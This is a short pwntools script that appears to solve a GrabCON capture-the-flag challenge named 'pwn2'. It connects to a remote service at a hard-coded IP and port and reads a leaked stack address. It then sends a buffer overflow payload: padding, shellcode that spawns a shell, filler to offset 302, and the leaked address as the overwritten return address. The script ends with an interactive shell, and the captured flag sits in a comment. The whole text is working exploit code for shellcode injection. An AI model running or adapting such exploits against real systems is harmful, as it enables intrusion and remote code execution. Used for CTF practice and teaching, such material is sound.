
from pwn import *

context(arch = 'i386', os = 'linux')

r = remote('35.246.42.94', 1337)
# r = process('./pwn2')

r.readline()
w = r.readline()

leak = int(str(w.split()[-1].decode())[:-1], 16)

p = b'A' * 4
p += asm(shellcraft.sh())
p += (302 - len(p)) * b'B'
p += p32(leak)

r.sendline(p)
r.interactive()

# GrabCON{Y0U_g0t_Sh3ll_B4asics}

